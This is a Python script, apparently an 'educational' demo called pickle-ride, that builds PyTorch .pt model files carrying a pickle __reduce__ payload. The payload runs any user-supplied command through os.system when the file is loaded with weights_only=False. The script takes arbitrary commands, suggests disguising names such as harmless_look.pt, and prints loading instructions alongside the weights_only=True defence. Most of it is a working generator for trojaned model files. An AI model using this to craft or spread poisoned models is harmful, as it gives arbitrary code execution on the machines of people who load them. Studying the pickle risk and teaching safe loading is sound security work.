#!/usr/bin/env python3
"""
pickle-ride | PyTorch Pickle RCE Demo
Author: Aryan Giri | giriaryan694-a11y
Educational Purpose Only — Demonstrates why weights_only=True is important
"""

import torch
import pickle
import os
import subprocess
import sys
from termcolor import colored
import pyfiglet

def print_banner():
    """Display awesome banner"""
    banner = pyfiglet.figlet_format("pickle-ride", font="slant")
    print(colored(banner, 'red'))
    print(colored("=" * 60, 'cyan'))
    print(colored("📚 PyTorch Pickle RCE Demo | Educational Purpose Only", 'yellow'))
    print(colored("👤 Made by Aryan Giri | giriaryan694-a11y", 'green'))
    print(colored("⚠️  Demonstrates why you should use weights_only=True", 'red'))
    print(colored("=" * 60, 'cyan'))
    print()

def get_user_command():
    """Ask user for custom command — neutral examples only"""
    print(colored("\n📡 What command should the model execute?", 'cyan'))
    print(colored("   Examples (safe, demonstrable):", 'yellow'))
    print("   1. touch hacked.txt")
    print("   2. echo 'This model is dangerous' > warning.txt")
    print("   3. ls -la > directory_listing.txt")
    print("   4. date > timestamp.txt")
    print("   5. echo 'You have been pwned (educational)'")
    print()
    print(colored("   💡 You can enter ANY command you want to test.", 'cyan'))
    print(colored("   🔒 We don't limit creativity — but use responsibly.", 'yellow'))
    
    print(colored("\n💀 Enter your custom command:", 'red'), end=" ")
    user_cmd = input().strip()
    
    if not user_cmd:
        print(colored("⚠️  No command entered. Using default: touch YOU_HAVE_BEEN_PWNED", 'yellow'))
        return 'touch YOU_HAVE_BEEN_PWNED'
    
    return user_cmd

def get_model_name():
    """Ask user for output model filename"""
    print(colored("\n📦 What should the model be named?", 'cyan'))
    print(colored("   Examples: harmless_look.pt, demo_model.pt, test.pt", 'yellow'))
    print(colored("💀 Enter model filename:", 'red'), end=" ")
    model_name = input().strip()
    
    if not model_name:
        model_name = "harmless_look.pt"
        print(colored(f"⚠️  Using default: {model_name}", 'yellow'))
    
    if not model_name.endswith('.pt'):
        model_name += '.pt'
    
    return model_name

def show_payload_preview(cmd):
    """Show what the payload will do"""
    print(colored("\n" + "=" * 60, 'cyan'))
    print(colored("🎯 PAYLOAD SUMMARY", 'magenta'))
    print(colored("=" * 60, 'cyan'))
    print(colored(f"📜 Command to execute: {cmd}", 'yellow'))
    print(colored("🐍 Pickle __reduce__ injection: os.system()", 'yellow'))
    print(colored("💣 Trigger: torch.load(model, weights_only=False)", 'red'))
    print(colored("=" * 60, 'cyan'))

class CustomPwn:
    """Custom payload that executes user's command"""
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        return (os.system, (self.command,))

def generate_model(cmd, model_name):
    """Generate the poisoned model"""
    try:
        print(colored("\n🔨 Generating demonstration model...", 'cyan'))
        
        # Create payload
        payload = CustomPwn(cmd)
        
        # Save as top-level object
        torch.save(payload, model_name)
        
        print(colored(f"✅ Successfully generated: {model_name}", 'green'))
        print(colored(f"⚠️  When loaded with weights_only=False, this will execute:", 'red'))
        print(colored(f"    💀 {cmd}", 'yellow'))
        
        # Show file size
        size = os.path.getsize(model_name)
        print(colored(f"📦 File size: {size} bytes", 'cyan'))
        
        return True
    except Exception as e:
        print(colored(f"❌ Error: {e}", 'red'))
        return False

def show_loading_instructions(model_name):
    """Show how to load the model"""
    print(colored("\n" + "=" * 60, 'cyan'))
    print(colored("📖 HOW TO TEST THE DEMONSTRATION", 'magenta'))
    print(colored("=" * 60, 'cyan'))
    
    load_code = f'''import torch

# DEMONSTRATION: This will execute your command
torch.load("{model_name}", weights_only=False)
print("✅ Model loaded — Your command was executed!")'''
    
    print(colored(load_code, 'green'))
    print(colored("\n🛡️  SAFE loading (prevents exploit):", 'yellow'))
    safe_code = f'''import torch
# This will raise an error because exec/os.system are not allowed
torch.load("{model_name}", weights_only=True)'''
    print(colored(safe_code, 'green'))
    print(colored("\n📚 LESSON: Always use weights_only=True with untrusted models", 'cyan'))
    print(colored("=" * 60, 'cyan'))

def main():
    """Main execution"""
    os.system('clear')  # Clear screen (use 'cls' on Windows)
    print_banner()
    
    print(colored("🎯 Welcome to pickle-ride — PyTorch Pickle RCE Demonstration", 'cyan'))
    print(colored("💡 Educational tool: Shows why pickle-based models are dangerous", 'yellow'))
    print(colored("🔬 Create .pt files that demonstrate arbitrary code execution", 'cyan'))
    
    # Get user inputs
    user_cmd = get_user_command()
    model_name = get_model_name()
    
    # Show what will happen
    show_payload_preview(user_cmd)
    
    # Confirm
    print(colored("\n❓ Generate this demonstration model? (y/n): ", 'red'), end="")
    confirm = input().strip().lower()
    
    if confirm == 'y':
        if generate_model(user_cmd, model_name):
            show_loading_instructions(model_name)
            print(colored("\n🔥 Knowledge is power. Use this to understand AI security.", 'magenta'))
            print(colored("👤 Made by Aryan Giri | Educational Purpose Only", 'cyan'))
            print(colored("📚 Always verify model sources. Never load untrusted .pt files.", 'yellow'))
        else:
            print(colored("\n❌ Generation failed!", 'red'))
    else:
        print(colored("\n❌ Cancelled. Run again to learn more.", 'yellow'))

if __name__ == "__main__":
    main()
